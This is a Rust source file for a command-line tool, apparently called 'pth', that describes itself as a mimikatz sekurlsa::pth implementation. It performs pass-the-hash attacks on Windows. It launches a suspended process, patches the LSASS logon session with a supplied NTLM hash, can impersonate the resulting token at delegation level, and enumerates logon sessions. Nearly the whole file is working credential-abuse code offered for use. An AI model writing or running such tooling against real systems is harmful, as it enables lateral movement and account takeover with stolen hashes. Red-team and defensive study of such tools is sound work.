#![allow(non_snake_case)]
#![allow(non_upper_case_globals)]
#![allow(unused_variables)]

mod binding {
    windows::include_bindings!();
}
mod error;
mod lsa;
mod lsa_crypt;
mod msv;

use binding::Windows::Win32::Kernel::LUID;
use binding::Windows::Win32::Security::{
    DuplicateTokenEx, GetTokenInformation, OpenProcessToken, SetThreadToken,
    SECURITY_IMPERSONATION_LEVEL, TOKEN_ACCESS_MASK, TOKEN_INFORMATION_CLASS, TOKEN_STATISTICS,
    TOKEN_TYPE,
};
use binding::Windows::Win32::SystemServices::{
    CreateProcessWithLogonW, CreateProcessWith_dwLogonFlags, ResumeThread, HANDLE,
    PROCESS_INFORMATION, PWSTR, STARTUPINFOW,
};
use binding::Windows::Win32::WindowsProgramming::CloseHandle;
use error::{LsaError, LsaResult};
use std::mem;

const CREATE_NEW_CONSOLE: u32 = 0x10;
const CREATE_SUSPENDED: u32 = 0x04;

pub struct PatchData<'a> {
    luid: LUID,
    ntlm: &'a [u8],
}

// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
pub fn pass_the_hash(
    user: String,
    luid: i64,
    domain: String,
    hsh: &[u8],
    cmdline: String,
    impersonate: bool,
) -> LsaResult<()> {
    if luid == 0 {
        unsafe {
            let pi: PROCESS_INFORMATION = mem::zeroed();
            let si: STARTUPINFOW = mem::zeroed();

            if CreateProcessWithLogonW(
                user,
                domain,
                "",
                CreateProcessWith_dwLogonFlags::LOGON_NETCREDENTIALS_ONLY,
                PWSTR::NULL,
                cmdline,
                CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
                0 as _,
                PWSTR::NULL,
                &si as *const STARTUPINFOW as _,
                &pi as *const PROCESS_INFORMATION as _,
            )
            .as_bool()
            {
                println!(
                    "Start process\n    Pid: {}    Tid: {}",
                    pi.dwProcessId, pi.dwThreadId
                );

                let token: HANDLE = HANDLE(0);
                if OpenProcessToken(
                    pi.hProcess,
                    TOKEN_ACCESS_MASK::TOKEN_QUERY
                        | if impersonate {
                            TOKEN_ACCESS_MASK::TOKEN_DUPLICATE
                        } else {
                            TOKEN_ACCESS_MASK(0)
                        },
                    &token as *const HANDLE as _,
                )
                .as_bool()
                {
                    let token_info: TOKEN_STATISTICS = mem::zeroed();
                    let needed_len: u32 = 0;
                    if GetTokenInformation(
                        token,
                        TOKEN_INFORMATION_CLASS::TokenStatistics,
                        &token_info as *const TOKEN_STATISTICS as _,
                        mem::size_of::<TOKEN_STATISTICS>() as u32,
                        &needed_len as *const u32 as _,
                    )
                    .as_bool()
                    {
                        println!("LUID: {}", token_info.AuthenticationId.LowPart);

                        let lsa = lsa::Lsa::new().unwrap();
                        lsa.handle_logon_session_lst(
                            false,
                            &Some(PatchData {
                                luid: token_info.AuthenticationId,
                                ntlm: hsh,
                            }),
                        )?;

                        if impersonate {
                            let new_token: HANDLE = HANDLE(0);

                            if DuplicateTokenEx(
                                token,
                                TOKEN_ACCESS_MASK::TOKEN_QUERY
                                    | TOKEN_ACCESS_MASK::TOKEN_IMPERSONATE,
                                0 as _,
                                SECURITY_IMPERSONATION_LEVEL::SecurityDelegation,
                                TOKEN_TYPE::TokenImpersonation,
                                &new_token as *const HANDLE as _,
                            )
                            .as_bool()
                            {
                                if SetThreadToken(0 as _, new_token).as_bool() {
                                    println!("Impersonate token ok");
                                } else {
                                    return Err(LsaError::new("Impersonate token error"));
                                }
                                CloseHandle(new_token);
                            } else {
                                return Err(LsaError::new("DuplicateTokenEx error"));
                            }
                        }
                        println!("Resume process");
                        ResumeThread(pi.hThread);
                    } else {
                        return Err(LsaError::new("GetTokenInformation error"));
                    }

                    CloseHandle(token);
                } else {
                    return Err(LsaError::new("OpenProcessToken error"));
                }
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            } else {
                return Err(LsaError::new("CreateProcessWithLogonW error"));
            }
        }
    } else {
        let lsa = lsa::Lsa::new()?;
        println!("LUID: {}", luid);
        lsa.handle_logon_session_lst(
            false,
            &Some(PatchData {
                luid: LUID {
                    LowPart: luid as u32 & 0xffffffff,
                    HighPart: (luid >> 32) as i32,
                },
                ntlm: hsh,
            }),
        )?;
    }
    Ok(())
}

use clap::{App, Arg, SubCommand};

pub fn main() {
    let app = App::new("pth")
        .about("mimikatz sekurlsa::pth implementation")
        .subcommand(SubCommand::with_name("enum"))
        .subcommand(
            SubCommand::with_name("patch")
                .arg(Arg::with_name("user").long("user").takes_value(true))
                .arg(
                    Arg::with_name("ntlm")
                        .long("ntlm")
                        .takes_value(true)
                        .required(true),
                )
                .arg(Arg::with_name("domain").long("domain").takes_value(true))
                .arg(Arg::with_name("luid").long("luid").takes_value(true))
                .arg(Arg::with_name("run").long("run").takes_value(true))
                .arg(
                    Arg::with_name("impersonate")
                        .long("impersonate")
                        .takes_value(false),
                ),
        );
    let m = app.get_matches();

    if let Some(c) = m.subcommand {
        match c.name.as_str() {
            "enum" => {
                let lsa = lsa::Lsa::new().unwrap();
                lsa.handle_logon_session_lst(true, &None).unwrap();
            }
            "patch" => {
                let mut hsh = [0_u8; msv::LM_NTLM_HASH_LENGTH];
                hex::decode_to_slice(c.matches.value_of("ntlm").unwrap(), &mut hsh).unwrap();

                if let Some(luid) = c.matches.value_of("luid") {
                    pass_the_hash(
                        String::new(),
                        luid.parse().unwrap_or(0),
                        String::new(),
                        &hsh,
                        String::new(),
                        false,
                    )
                    .unwrap();
                } else {
                    let user = c.matches.value_of("user").expect("Missing argument: user");
                    let domain = c
                        .matches
                        .value_of("domain")
                        .expect("Missing argument: domain");
                    let run = c.matches.value_of("run").unwrap_or("cmd.exe");
                    let impersonate = c.matches.is_present("impersonate");

                    pass_the_hash(
                        String::from(user),
                        0,
                        String::from(domain),
                        &hsh,
                        String::from(run),
                        impersonate,
                    )
                    .unwrap();
                }
            }
            _ => (),
        }
    }
}
